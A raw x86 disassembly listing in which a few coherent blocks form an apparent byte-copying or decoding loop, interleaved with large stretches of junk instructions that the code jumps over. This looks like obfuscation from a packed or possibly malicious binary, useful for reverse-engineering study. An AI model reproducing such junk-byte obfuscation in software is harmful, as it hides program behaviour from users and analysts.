  406a48:	sub    al,0xbe
  406a4a:	or     DWORD PTR [edi+0x61],0x4c
  406a4e:	rol    BYTE PTR [edi],cl
  406a50:	mov    ds:0x11ce19da,al
  406a55:	jmp    0x2989c52f
  406a5a:	xor    BYTE PTR [ebp-0x30766007],0xdb
  406a61:	or     eax,0xf0449c8f
  406a66:	and    al,0xea
  406a68:	imul   edi,DWORD PTR [eax],0x6875a33e
  406a6e:	into   
  406a6f:	sti    
  406a70:	lods   al,BYTE PTR ds:[esi]
  406a71:	adc    eax,0x369b5fd
  406a76:	iret   
  406a77:	and    BYTE PTR [ecx+esi*1+0x75],0x82
  406a7c:	cdq    
  406a7d:	mov    bl,0x75
  406a7f:	aaa    
  406a80:	xchg   ebp,eax
  406a81:	mov    cl,BYTE PTR [edx-0xb]
  406a84:	mov    eax,eax
  406a86:	inc    eax
  406a87:	cmp    bh,0xbb
  406a8a:	ss xchg esp,eax
  406a8c:	sub    DWORD PTR [ebx],ebp
  406a8e:	sub    al,0xcb
  406a90:	stos   DWORD PTR es:[edi],eax
  406a91:	mov    ebp,0x11695167
  406a96:	call   0xa8eb:0x8a5dad6e
  406a9d:	or     dh,bh
  406a9f:	aas    
  406aa0:	(bad)  
  406aa1:	lds    ebp,FWORD PTR [esi+0x2e2db3c5]
  406aa7:	sub    eax,0xe93721c8
  406aac:	push   eax
  406aad:	xor    eax,0x11695ee4
  406ab2:	je     0x406ab7
  406ab4:	test   al,ch
  406ab6:	inc    eax
  406ab7:	push   0x92939e4f
  406abc:	popf   
  406abd:	clc    
  406abe:	sub    BYTE PTR [ebx+0x34667ca0],al
  406ac4:	jnp    0x406ada
  406ac6:	jecxz  0x406b17
  406ac8:	das    
  406ac9:	enter  0x6a17,0x18
  406acd:	repnz mov ds:0x91dca927,al
  406ad3:	jmp    0x406ac3
  406ad5:	(bad)  
  406ad6:	push   ebp
  406ad7:	pop    edx
  406ad8:	push   ds
  406ad9:	cmp    eax,0xcb305bc0
  406ade:	sbb    DWORD PTR [edx],0xffffffef
  406ae1:	inc    edx
  406ae2:	add    bl,ch
  406ae4:	jae    0x406af6
  406ae6:	int3   
  406ae7:	xor    eax,0x7a291175
  406aec:	aam    0x6
  406aee:	pop    ds
  406aef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406af0:	xlat   BYTE PTR ds:[ebx]
  406af1:	jle    0x406a77
  406af3:	mov    ebp,0xdb9cd6bc
  406af8:	jecxz  0x406b2d
  406afa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406afb:	cs test eax,0x41527f7f
  406b01:	repz (bad) 
  406b03:	xor    DWORD PTR [esi],esp
  406b05:	retf   0x1bd5
  406b08:	lea    ebx,[ecx]
  406b0a:	jo     0x406ad1
  406b0c:	leave  
  406b0d:	cmp    al,BYTE PTR [ebp+ecx*1-0x1e]
  406b11:	or     cl,0x3f
  406b14:	inc    edi
  406b15:	ficomp WORD PTR [esi]
  406b17:	jge    0x406aa3
  406b19:	out    dx,eax
  406b1a:	add    dh,0xe8
  406b1d:	adc    al,BYTE PTR [ebx]
  406b1f:	dec    edx
  406b20:	sub    ebp,edx
  406b22:	or     DWORD PTR [ecx+0x4fb26b15],esi
  406b28:	fwait
  406b29:	dec    ebx
  406b2a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406b2b:	iret   
  406b2c:	jns    0x406af6
  406b2e:	mov    eax,0xbb9b9a4e
  406b33:	dec    esi
  406b34:	cmp    DWORD PTR [edi],ebp
  406b36:	sub    eax,0x8879f178
  406b3b:	or     ebx,DWORD PTR ds:0x65d79306
  406b41:	jle    0x406b40
  406b43:	fsub   QWORD PTR [esi-0x4d33a59d]
  406b49:	mov    WORD PTR [ebx],?
  406b4b:	inc    edi
  406b4c:	popf   
  406b4d:	add    edx,ecx
  406b4f:	jmp    0x406fb2
  406b54:	mov    edx,DWORD PTR [ebp-0x18]
  406b57:	xor    edx,eax
  406b59:	add    edx,DWORD PTR [ebp-0x14]
  406b5c:	mov    edi,DWORD PTR [ebp-0x1c]
  406b5f:	mov    dl,BYTE PTR [edx+edi*1+0x32729f]
  406b66:	mov    BYTE PTR [ebp+0xf],dl
  406b69:	mov    edx,DWORD PTR [ebp-0xc]
  406b6c:	xor    edx,eax
  406b6e:	add    edx,DWORD PTR [ebp-0x14]
  406b71:	jmp    0x406cc3
  406b76:	mov    ah,0x9b
  406b78:	scas   al,BYTE PTR es:[edi]
  406b79:	pop    es
  406b7a:	popa   
  406b7b:	cmp    edx,DWORD PTR [ebp+0x59]
  406b7e:	(bad)  
  406b80:	xor    DWORD PTR [eax+0x2e79af5b],ecx
  406b86:	jecxz  0x406b8e
  406b88:	jle    0x406c08
  406b8a:	and    edi,DWORD PTR [edi+0x7e]
  406b8d:	jle    0x406b17
  406b8f:	xchg   ecx,eax
  406b90:	cmp    ebx,DWORD PTR [edi+0x65]
  406b93:	sub    BYTE PTR [edx-0x4d],bl
  406b96:	jns    0x406c0b
  406b98:	mov    bl,BYTE PTR [ecx+0x20908644]
  406b9e:	bound  ebp,QWORD PTR [edx-0x6a3bcd1d]
  406ba4:	mov    ds:0x50960d52,al
  406ba9:	push   eax
  406baa:	add    al,0x74
  406bac:	dec    ebp
  406bad:	mov    bh,0xb4
  406baf:	mov    es,WORD PTR [esi-0x49ba14c8]
  406bb5:	es repnz or esi,esi
  406bb9:	add    al,0xf8
  406bbb:	in     eax,0x48
  406bbd:	ret    0xe808
  406bc0:	xor    esi,DWORD PTR [ebx+0x48f8ca5d]
  406bc6:	add    eax,0x756afcac
  406bcb:	xchg   ebp,eax
  406bcc:	push   esp
  406bcd:	or     BYTE PTR [edx-0x53],dl
  406bd0:	jns    0x406b70
  406bd2:	(bad)  
  406bd3:	sar    DWORD PTR [esi-0x33],cl
  406bd6:	adc    ebx,DWORD PTR [eax+0x5e11e0ad]
  406bdc:	xchg   DWORD PTR [ebp-0x54cf589f],edi
  406be2:	dec    ebp
  406be3:	sub    bl,BYTE PTR [esi-0x2c8d0a60]
  406be9:	fisub  WORD PTR [ecx-0x27]
  406bec:	bound  eax,QWORD PTR [ebx-0x4b639956]
  406bf2:	lods   al,BYTE PTR ds:[esi]
  406bf3:	pop    eax
  406bf4:	sub    eax,0xdaa10061
  406bf9:	pop    esp
  406bfa:	nop
  406bfb:	sbb    BYTE PTR [ebp-0x13],dh
  406bfe:	clc    
  406bff:	aas    
  406c00:	ret    
  406c01:	jmp    0x406baa
  406c03:	(bad)
  406c07:	mov    ch,0xd4
  406c09:	(bad)  
  406c0a:	out    0x75,al
  406c0c:	jns    0x406ba6
  406c0e:	leave  
  406c0f:	in     al,0x2a
  406c11:	jl     0x406bc8
  406c13:	or     DWORD PTR [edi+0x72ebfb54],ecx
  406c19:	dec    esp
  406c1a:	push   eax
  406c1b:	add    DWORD PTR [eax-0x12],0xe2545a62
  406c22:	sbb    esp,esi
  406c24:	mov    al,0xc
  406c26:	(bad)  
  406c28:	sbb    DWORD PTR ds:0xd0d471f6,0x8a83c3a1
  406c32:	into   
  406c33:	jo     0x406caf
  406c35:	pop    edx
  406c36:	shl    DWORD PTR [ebp+0x3c],1
  406c39:	mov    ecx,0xf2d49164
  406c3e:	and    ebx,edx
  406c40:	or     DWORD PTR [esi-0x36],0x63
  406c44:	adc    al,0x52
  406c46:	pop    es
  406c47:	cmp    eax,0x89f29bea
  406c4c:	stos   BYTE PTR es:[edi],al
  406c4d:	ins    BYTE PTR es:[di],dx
  406c4f:	loope  0x406c0c
  406c51:	fld    QWORD PTR [edi+0x232019fe]
  406c57:	hlt    
  406c58:	int    0x64
  406c5a:	pop    esi
  406c5b:	pop    esi
  406c5c:	mov    ah,0xee
  406c5e:	mov    bl,0xb6
  406c60:	ins    DWORD PTR es:[edi],dx
  406c61:	add    cl,BYTE PTR [ebx]
  406c63:	aad    0x5b
  406c65:	ds sbb bh,ah
  406c68:	dec    ebx
  406c69:	add    al,dh
  406c6b:	jp     0x406c73
  406c6d:	in     al,dx
  406c6e:	sub    BYTE PTR [edi+0x42061d32],0x62
  406c75:	std    
  406c76:	mov    ebp,0x971036c7
  406c7b:	jge    0x406c96
  406c7d:	(bad)  
  406c7e:	popa   
  406c7f:	dec    esi
  406c80:	icebp  
  406c81:	or     eax,0xcd8528d5
  406c86:	outs   dx,DWORD PTR ds:[esi]
  406c87:	mov    cl,bh
  406c89:	and    al,0xf1
  406c8b:	sub    ah,ah
  406c8d:	jnp    0x406cc7
  406c8f:	xor    BYTE PTR [edx+0x7],ch
  406c92:	jo     0x406c3a
  406c94:	mov    ebp,0x20d997a
  406c99:	outs   dx,DWORD PTR ds:[esi]
  406c9a:	aam    0xa0
  406c9c:	addr16 out 0x45,al
  406c9f:	fmul   DWORD PTR [edi]
  406ca1:	mov    edx,0xf86f43e3
  406ca6:	push   ecx
  406ca7:	xchg   ebx,eax
  406ca8:	mov    dl,0x7e
  406caa:	scas   al,BYTE PTR es:[edi]
  406cab:	mov    ah,0xdf
  406cad:	mov    esp,0x56e12daa
  406cb2:	bound  ecx,QWORD PTR [edx]
  406cb4:	sti    
  406cb5:	ds xchg ebp,eax
  406cb7:	pop    esi
  406cb8:	xchg   ebp,eax
  406cb9:	call   0xb5:0xf6b74d20
  406cc0:	xchg   edx,eax
  406cc1:	and    BYTE PTR [ecx-0x751b8275],0x94
  406cc8:	cmp    bl,BYTE PTR [edi-0x77ffcd8e]
  406cce:	push   ebp
  406ccf:	or     ecx,DWORD PTR [edx+0x7d8b0f55]
  406cd5:	hlt    
  406cd6:	xor    edi,eax
  406cd8:	add    edi,DWORD PTR [ebp-0x14]
  406cdb:	mov    ebx,DWORD PTR [ebp-0x1c]
  406cde:	jmp    0x406e30
  406ce3:	stos   DWORD PTR es:[edi],eax
  406ce4:	out    dx,eax
  406ce5:	pop    edx
  406ce6:	sbb    al,0x5a
  406ce8:	test   eax,0x2e197979
  406ced:	leave  
  406cee:	ss je  0x406c82
  406cf1:	xchg   BYTE PTR [eax-0x6c],dl
  406cf4:	pop    es
  406cf5:	jle    0x406d75
  406cf7:	and    edi,DWORD PTR [edi+0x7e]
  406cfa:	jle    0x406d51
  406cfc:	push   edx
  406cfd:	dec    esp
  406cfe:	into   
  406cff:	jb     0x406d76
  406d01:	sahf   
  406d02:	inc    esi
  406d03:	ret    0x96c7
  406d06:	cld    
  406d07:	inc    ebp
  406d08:	cli    
  406d09:	test   al,0xc5
  406d0b:	xor    edi,DWORD PTR [ecx+edi*2+0x39]
  406d0f:	icebp  
  406d10:	dec    edx
  406d11:	scas   eax,DWORD PTR es:[edi]
  406d12:	dec    eax
  406d13:	push   es
  406d14:	loopne 0x406c9d
  406d16:	push   ds
  406d17:	mov    ch,0xb7
  406d19:	cwde   
  406d1a:	jbe    0x406ce3
  406d1c:	cmp    eax,0x64b54b67
  406d21:	jb     0x406d7b
  406d23:	push   ss
  406d24:	outs   dx,BYTE PTR ds:[esi]
  406d25:	gs sti 
  406d27:	and    eax,ecx
  406d29:	outs   dx,DWORD PTR ds:[esi]
  406d2a:	ret    0xbf3e
  406d2d:	xlat   BYTE PTR ds:[ebx]
  406d2e:	test   BYTE PTR [esi],0x11
  406d31:	addr16 dec edx
  406d33:	push   cs
  406d34:	push   edi
  406d35:	sar    cl,cl
  406d37:	inc    DWORD PTR [ecx]
  406d39:	xor    eax,0x2ccc5200
  406d3e:	sti    
  406d3f:	popf   
  406d40:	fs das 
  406d42:	mov    ebp,0xf68e5cd6
  406d47:	(bad)  
  406d48:	sbb    DWORD PTR [ebx+0x306ca324],ebp
  406d4e:	dec    edx
  406d4f:	mov    dh,0xb0
  406d51:	adc    al,0x1d
  406d53:	and    DWORD PTR [edx+0x5e6bc25f],ebx
  406d59:	test   DWORD PTR [ebp+0x7bb9ed98],edi
  406d5f:	mov    ebx,0xef4e0cb2
  406d64:	dec    edi
  406d65:	cdq    
  406d66:	xor    al,0x66
  406d68:	add    eax,DWORD PTR [ebx+0x316a7ebd]
  406d6e:	imul   ebx,DWORD PTR [edi],0x41
  406d71:	bound  ebx,QWORD PTR [edi]
  406d73:	imul   ebx,DWORD PTR [edi],0x66
  406d76:	adc    ah,BYTE PTR [ecx+eiz*2-0x62]
  406d7a:	pop    ecx
  406d7b:	adc    cl,BYTE PTR [esi-0x1fdfdab5]
  406d81:	jl     0x406d98
  406d83:	adc    esp,DWORD PTR [edi+esi*1-0xd]
  406d87:	jo     0x406d84
  406d89:	call   0x1082:0x3c7c13ef
  406d90:	(bad)  [eax+0x1a]
  406d93:	iret   
  406d94:	inc    esp
  406d95:	popa   
  406d96:	sbb    edi,esp
  406d98:	and    ecx,DWORD PTR [esi+ebp*4-0x115abfb1]
  406d9f:	push   ecx
  406da0:	retf   
  406da1:	mov    edx,0xbb8737ee
  406da6:	mov    esi,0x6f0318d0
  406dab:	jbe    0x406dd8
  406dad:	arpl   WORD PTR [edx+0x344c3943],bx
  406db3:	push   edx
  406db4:	stos   DWORD PTR es:[edi],eax
  406db5:	shl    BYTE PTR [edi+0x2],0xe0
  406db9:	dec    eax
  406dba:	jbe    0x406e16
  406dbc:	push   ss
  406dbd:	rol    cl,1
  406dbf:	dec    ecx
  406dc0:	es (bad) 
  406dc2:	sbb    eax,0xabf33a73
  406dc7:	aam    0x70
  406dc9:	sub    al,0x20
  406dcb:	sahf   
  406dcc:	imul   edi,edx,0xd57cafe5
  406dd2:	sbb    eax,0xe37a4265
  406dd7:	sbb    DWORD PTR es:[esi],esp
  406dda:	mov    ebx,0x476fbfe4
  406ddf:	jge    0x406d8b
  406de1:	xchg   ebx,eax
  406de2:	repz jb 0x406e4a
  406de5:	arpl   WORD PTR [eax-0x40],si
  406de8:	inc    ebp
  406de9:	gs scas eax,DWORD PTR es:[edi]
  406deb:	rcl    BYTE PTR [ecx+0x3e],1
  406dee:	aaa    
  406def:	adc    BYTE PTR [ebx-0x6b8a0ffc],0x7d
  406df6:	push   eax
  406df7:	xor    DWORD PTR [esi],edi
  406df9:	(bad)  
  406dfb:	cmp    edx,DWORD PTR [ecx+ebx*1+0x64]
  406dff:	push   es
  406e00:	pop    esp
  406e01:	cmp    ecx,edi
  406e03:	(bad)  
  406e04:	(bad)  
  406e06:	or     al,0xad
  406e08:	mov    eax,0xd5d556ca
  406e0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e0e:	out    0x4f,eax
  406e10:	inc    ebp
  406e11:	(bad)  
  406e12:	mov    cl,0xed
  406e14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406e15:	mov    ds,esi
  406e17:	fmul   DWORD PTR [ebx+ecx*8-0x41]
  406e1b:	shl    DWORD PTR [ebp+0x4b06553c],1
  406e21:	xchg   esi,eax
  406e22:	xor    eax,0x6b3de90
  406e27:	call   0x4836a5dc
  406e2c:	in     eax,dx
  406e2d:	pop    edi
  406e2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e2f:	inc    ebx
  406e30:	mov    BYTE PTR [edi+ebx*1+0x32729f],dl
  406e37:	jmp    0x406f89
  406e3c:	jns    0x406e62
  406e3e:	mov    dh,0xd8
  406e40:	dec    ebx
  406e41:	js     0x406ebc
  406e43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e44:	mov    BYTE PTR [esi-0x4],bl
  406e47:	lods   al,BYTE PTR ds:[esi]
  406e48:	int3   
  406e49:	(bad)  
  406e4b:	jmp    0x7f23:0x7e7e0459
  406e52:	jle    0x406ed2
  406e54:	cmc    
  406e55:	rcl    BYTE PTR [esi-0x66],0x1d
  406e59:	add    eax,ebx
  406e5b:	in     al,dx
  406e5c:	dec    esp
  406e5d:	and    al,0x5
  406e5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e60:	xlat   BYTE PTR ds:[ebx]
  406e61:	mov    dh,0x5c
  406e63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e64:	mov    ds:0xc694dd79,al
  406e69:	(bad)  
  406e6b:	pop    ss
  406e6c:	jne    0x406e29
  406e6e:	stc    
  406e6f:	inc    ebx
  406e70:	jl     0x406eec
  406e72:	jmp    0xe60:0x1d1190a7
  406e79:	sbb    dh,BYTE PTR [ebx+ecx*1+0x44f75033]
  406e80:	sub    edi,DWORD PTR [edx]
  406e82:	sbb    al,dl
  406e84:	jl     0x406ec2
  406e86:	sbb    dl,dh
  406e88:	push   ds
  406e89:	mov    ds:0xedbd99a,eax
  406e8e:	mov    ds:0x122d9476,eax
  406e93:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406e94:	fdivr  DWORD PTR [edi]
  406e96:	jl     0x406e32
  406e98:	or     ch,BYTE PTR [eax]
  406e9a:	adc    cl,BYTE PTR [edx-0x221aaba4]
  406ea0:	and    DWORD PTR [edi+0x4a7d8995],edi
  406ea6:	pop    ss
  406ea7:	inc    ecx
  406ea8:	dec    edx
  406ea9:	xor    eax,0x97889ff5
  406eae:	daa    
  406eaf:	out    dx,al
  406eb0:	pop    es
  406eb1:	push   esi
  406eb2:	mov    ds:0xd5221212,eax
  406eb7:	repnz xor ah,BYTE PTR [edx+edx*4]
  406ebb:	xor    BYTE PTR [ecx*1+0x13ff92ff],al
  406ec2:	adc    BYTE PTR [esi],ch
  406ec4:	es (bad) 
  406ec7:	sbb    ch,BYTE PTR [eax-0x385f65fa]
  406ecd:	push   es
  406ece:	ret    
  406ecf:	cmp    al,0xc0
  406ed1:	mov    gs,WORD PTR [edx-0x33dc83e1]
  406ed7:	lods   al,BYTE PTR ds:[esi]
  406ed8:	dec    edi
  406ed9:	rcl    BYTE PTR [eax-0x43d28310],0xa8
  406ee0:	mov    eax,0xf3a94c18
  406ee5:	xor    BYTE PTR [edi+0x61],al
  406ee8:	sub    al,0xdb
  406eea:	mov    esi,0x4614e6f
  406eef:	dec    ax
  406ef1:	std    
  406ef2:	lea    edx,[ebp-0x4436822a]
  406ef8:	fld    QWORD PTR [eax-0x1f40c15]
  406efe:	mov    DWORD PTR [ebp-0x16c7e978],edx
  406f04:	sti    
  406f05:	sar    BYTE PTR es:[ebx-0x77],0x96
  406f0a:	retf   0xf4e2
  406f0d:	and    BYTE PTR [edi],dh
  406f0f:	iret   
  406f10:	xchg   ch,dl
  406f12:	(bad)  
  406f13:	cdq    
  406f14:	scas   eax,DWORD PTR es:[edi]
  406f15:	jo     0x406eab
  406f17:	adc    DWORD PTR fs:[edx-0x5],esi
  406f1b:	(bad)  
  406f1c:	fisubr WORD PTR ds:0x7a1ca521
  406f22:	scas   eax,DWORD PTR es:[edi]
  406f23:	xlat   BYTE PTR ds:[ebx]
  406f24:	in     al,dx
  406f25:	or     al,0x16
  406f27:	xchg   ebp,eax
  406f28:	mov    al,ds:0xf72b474d
  406f2d:	xor    eax,0x85b737ea
  406f32:	cmc    
  406f33:	repz cmp DWORD PTR [ebx-0x42c859eb],edx
  406f3a:	pop    es
  406f3b:	fmul   st(4),st
  406f3d:	add    eax,0x258fcd42
  406f42:	ds push ecx
  406f44:	repz pop eax
  406f46:	lds    edx,FWORD PTR [esi]
  406f48:	lds    ebx,FWORD PTR [ebx-0x27]
  406f4b:	and    eax,0xe0a40e26
  406f50:	and    ebx,DWORD PTR [eax-0x12335c59]
  406f56:	adc    eax,0x93942dc0
  406f5b:	mov    eax,ds:0xfecb657a
  406f60:	sahf   
  406f61:	add    al,0xa7
  406f63:	gs aas 
  406f65:	xor    DWORD PTR [edi-0x72905f95],esp
  406f6b:	aam    0xdd
  406f6d:	cmp    edx,DWORD PTR [esi+esi*8-0x72]
  406f71:	xchg   ecx,eax
  406f72:	inc    eax
  406f73:	test   al,0xd8
  406f75:	mov    ebp,0x9b7eeed4
  406f7a:	dec    esi
  406f7b:	test   BYTE PTR [ebx-0xed0073c],cl
  406f81:	ficom  WORD PTR [eax-0x4feae473]
  406f87:	inc    ebx
  406f88:	out    dx,eax
  406f89:	mov    dl,BYTE PTR [ebp+0xb]
  406f8c:	mov    edi,DWORD PTR [ebp-0x18]
  406f8f:	xor    edi,eax
  406f91:	add    edi,DWORD PTR [ebp-0x14]
  406f94:	mov    ebx,DWORD PTR [ebp-0x1c]
  406f97:	mov    BYTE PTR [edi+ebx*1+0x32729f],dl
  406f9e:	mov    edx,DWORD PTR [ebp-0x44]
  406fa1:	mov    edi,DWORD PTR [ebp-0xc]
  406fa4:	xor    edx,eax
  406fa6:	xor    edi,eax
  406fa8:	add    edx,ecx
  406faa:	add    edi,ecx
  406fac:	imul   edx,edi
  406faf:	add    edx,DWORD PTR [ebp-0x14]
  406fb2:	mov    DWORD PTR [ebp-0x14],edx
  406fb5:	mov    edx,DWORD PTR [ebp-0xc]
  406fb8:	mov    edi,DWORD PTR [ebp-0x24]
  406fbb:	xor    edx,eax
  406fbd:	add    edx,ecx
  406fbf:	imul   edx,edi
  406fc2:	mov    edi,DWORD PTR [ebp-0xc]
  406fc5:	xor    edi,eax
  406fc7:	sub    edx,edi
  406fc9:	mov    edi,DWORD PTR [ebp-0xc]
  406fcc:	mov    ebx,DWORD PTR [ebp-0x14]
  406fcf:	xor    edi,eax
  406fd1:	add    edi,ecx
  406fd3:	imul   edi,ebx
  406fd6:	mov    ebx,DWORD PTR [ebp-0x18]
  406fd9:	xor    ebx,eax
  406fdb:	sub    edx,ecx
  406fdd:	lea    edi,[edi+ebx*1+0x32729f]
  406fe4:	cmp    edi,edx
  406fe6:	jbe    0x406b54
  406fec:	mov    edx,DWORD PTR [ebp-0xc]
  406fef:	mov    edi,DWORD PTR [ebp-0x24]
  406ff2:	xor    edx,eax
  406ff4:	add    edx,ecx
  406ff6:	imul   edx,edi
  406ff9:	mov    edi,DWORD PTR [ebp-0x18]
  406ffc:	xor    edi,eax
  406ffe:	jmp    0x407150
  407003:	hlt    
  407004:	jae    0x40702b
  407006:	pop    ds
  407007:	mov    ecx,0xa4a98439
  40700c:	pushf  
  40700d:	sbb    al,0x11
  40700f:	dec    ebx
  407010:	leave  
  407011:	icebp  
  407012:	cmp    DWORD PTR [edx],eax
  407014:	sbb    bh,BYTE PTR [esi+0x7e]
  407017:	and    edi,DWORD PTR [edi+0x7e]
  40701a:	jle    0x40707b
  40701c:	push   ebx
  40701d:	test   eax,0x6cac8cbe
  407022:	test   eax,0xa96f673
  407027:	mov    ds:0x7d3a486e,al
  40702c:	(bad)  
  40702d:	xor    ebx,DWORD PTR [ecx]
  40702f:	dec    esi
  407030:	imul   ecx,DWORD PTR [esi-0x585a3c18],0x70
  407037:	sbb    ch,BYTE PTR [ebx]
  407039:	or     al,0xdf
  40703b:	sub    bh,BYTE PTR [ebx+0x1680f6a7]
  407041:	pop    ds
  407042:	sub    ebp,DWORD PTR [ebp-0x36be7e59]
  407048:	sub    ecx,DWORD PTR [ecx]
  40704a:	inc    eax
  40704b:	mov    ah,0x11
  40704d:	jmp    0xb10a7b8
  407052:	inc    edx
  407053:	aaa    
  407054:	iret   
  407055:	loopne 0x40703c
  407057:	and    DWORD PTR [eax+0x644a6d0a],esp
  40705d:	mov    edi,0xfb7c2452
  407062:	xchg   esp,eax
  407063:	ins    BYTE PTR es:[edi],dx
  407064:	test   al,0xeb
  407066:	(bad)  
  407067:	push   ebp
  407068:	lods   al,BYTE PTR ds:[esi]
  407069:	popf   
  40706a:	adc    eax,0x8fe6d818
  40706f:	bnd jbe 0x407092
  407072:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407074:	and    al,0x7b
  407076:	mov    al,0xee
  407078:	ss adc eax,0xf67d7ea0
  40707e:	jno    0x40707b
  407080:	(bad)  
  407081:	fidivr WORD PTR [ebp*2+0x6b0d9734]
  407088:	sub    ah,BYTE PTR [edi-0x1e]
  40708b:	xchg   esp,eax
  40708c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40708d:	sbb    BYTE PTR [edi],0xb2
  407090:	pop    eax
  407091:	pop    ds
  407092:	(bad)  
  407093:	out    0x92,al
  407095:	jmp    0x74e89d24
  40709a:	cmp    edi,edi
  40709c:	clc    
  40709d:	mov    dh,0x6d
  40709f:	scas   al,BYTE PTR es:[edi]
  4070a0:	sub    BYTE PTR [esi+0x42],0x18
  4070a4:	inc    ecx
  4070a5:	aas    
  4070a6:	sub    esi,ecx
  4070a8:	and    dl,BYTE PTR [ebx]
  4070aa:	push   ecx
  4070ab:	mov    eax,0x8567831a
  4070b0:	dec    esi
  4070b1:	mov    dh,BYTE PTR [eax-0x3a9b23cc]
  4070b7:	xchg   edx,eax
  4070b8:	or     bh,BYTE PTR ds:0x6978c1c
  4070be:	add    DWORD PTR [edi],esp
  4070c0:	jmp    0x407093
  4070c2:	inc    esi
  4070c3:	xor    al,0xa6
  4070c5:	xchg   esp,eax
  4070c6:	add    ebp,ebp
  4070c8:	nop
  4070c9:	add    al,0xe5
  4070cb:	sbb    cl,dh
  4070cd:	push   ebx
  4070ce:	jg     0x407142
  4070d0:	inc    eax
  4070d1:	xor    cl,BYTE PTR [edx-0x72]
  4070d4:	pop    ds
  4070d5:	dec    ebx
  4070d6:	(bad)  
  4070d7:	jb     0x40711d
  4070d9:	mov    ds:0x9e469270,eax
  4070de:	int3   
  4070df:	pop    esp
  4070e0:	cmp    al,0x27
  4070e2:	out    0x59,al
  4070e4:	jo     0x4070df
  4070e6:	sub    DWORD PTR [ebx],ebp
  4070e8:	push   edi
  4070e9:	xor    al,0x27
  4070eb:	ret    
  4070ec:	and    dl,BYTE PTR [eax-0x26]
  4070ef:	lahf   
  4070f0:	mov    bl,0xf0
  4070f2:	mov    ebp,0x8d3620a9
  4070f7:	imul   eax,ecx,0xffffff8c
  4070fa:	pop    edi
  4070fb:	and    DWORD PTR [ecx+0x57],edx
  4070fe:	mov    esi,0x5b034e0a
  407103:	loope  0x407117
  407105:	mov    esp,0x1b3004ef
  40710a:	fstp   TBYTE PTR [ecx]
  40710c:	daa    
  40710d:	rcl    esp,0xb9
  407110:	sub    BYTE PTR [edx+ebx*1],bh
  407113:	sub    al,BYTE PTR [edx]
  407115:	ss cwde 
  407117:	repz fstp st(7)
  40711a:	sbb    edi,DWORD PTR [edi+eiz*8]
  40711d:	(bad)  
  40711e:	push   ebp
  40711f:	cmp    eax,0xb7804b62
  407124:	xchg   BYTE PTR [eax-0x651088c1],ah
  40712a:	pop    ebp
  40712b:	xchg   ah,bl
  40712d:	(bad)  
  40712e:	xor    edx,ebx
  407130:	es js  0x40710f
  407133:	or     al,0x9d
  407135:	retf   0x877f
  407138:	lahf   
  407139:	shl    ebx,cl
  40713b:	adc    al,0xfa
  40713d:	add    bl,BYTE PTR [eax]
  40713f:	or     DWORD PTR [edx+0x8],eax
  407142:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407143:	test   al,0x6d
  407145:	(bad)  
  407146:	int    0xcc
  407148:	ins    BYTE PTR es:[edi],dx
  407149:	stos   DWORD PTR es:[edi],eax
  40714a:	jp     0x407153
  40714c:	adc    DWORD PTR [ebp-0x28fcb099],ebx
  407152:	mov    edi,DWORD PTR [ebp-0x8]
  407155:	lea    edx,[edx+edi*1+0x32729f]
  40715c:	mov    DWORD PTR [ebp-0x8],edx
  40715f:	mov    edx,DWORD PTR [ebp-0x20]
  407162:	xor    edx,eax
  407164:	mov    edi,0xffcd8d61
  407169:	sub    edi,edx
  40716b:	add    edi,DWORD PTR [ebp-0x10]
  40716e:	jmp    0x4072c0
  407173:	sub    ebp,DWORD PTR [edi+0x59798f79]
  407179:	jmp    0x9398b939
  40717e:	sub    al,0x1e
  407180:	enter  0xc79a,0x37
  407184:	sbb    edi,DWORD PTR [esi+0x7e]
  407187:	and    edi,DWORD PTR [edi+0x7e]
  40718a:	jle    0x40710c
  40718c:	pop    ebp
  40718d:	sbb    al,0x67
  40718f:	fidivr WORD PTR [ebx+0x7ffd1a5b]
  407195:	mov    bl,0x2d
  407197:	mov    esi,DWORD PTR [ebp-0x2b]
  40719a:	push   ss
  40719b:	ins    DWORD PTR es:[edi],dx
  40719c:	or     eax,0x5a49e806
  4071a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4071a2:	enter  0x5ff3,0x75
  4071a6:	out    0x73,al
  4071a8:	add    BYTE PTR [esi+0x6842c77e],al
  4071ae:	dec    edx
  4071af:	push   es
  4071b0:	jne    0x40714f
  4071b2:	and    dl,bh
  4071b4:	rcr    ch,cl
  4071b6:	sub    dl,al
  4071b8:	or     bh,bh
  4071ba:	sub    DWORD PTR [edi+0x72],ebx
  4071bd:	int    0x1
  4071bf:	add    BYTE PTR [edx-0x520796d0],ch
  4071c5:	test   DWORD PTR [eax],0xf17456b4
  4071cb:	mov    cl,BYTE PTR [edx-0x7b]
  4071ce:	adc    DWORD PTR [esi],ecx
  4071d0:	pop    es
  4071d1:	mov    WORD PTR [edi-0x562b18b3],cs
  4071d7:	loope  0x40715f
  4071d9:	mov    ch,0x12
  4071db:	iret   
  4071dc:	mov    dh,0x2d
  4071de:	jno    0x4071f9
  4071e0:	jl     0x40719f
  4071e2:	cdq    
  4071e3:	nop
  4071e4:	and    DWORD PTR [eax+0x244b39c1],edx
  4071ea:	mov    al,0xd3
  4071ec:	xlat   BYTE PTR ds:[ebx]
  4071ed:	mov    ah,0xf0
  4071ef:	push   0xc2851890
  4071f4:	jl     0x4071f1
  4071f6:	shl    al,0x26
  4071f9:	clc    
  4071fa:	cmp    al,al
  4071fc:	lods   al,BYTE PTR ds:[esi]
  4071fd:	jno    0x407247
  4071ff:	push   ebx
  407200:	add    al,0xcc
  407202:	sub    edx,DWORD PTR [edx]
  407204:	jl     0x4071d0
  407206:	daa    
  407207:	fsubr  DWORD PTR [esi]
  407209:	neg    BYTE PTR [ebx-0x2f]
  40720c:	lods   eax,DWORD PTR ds:[esi]
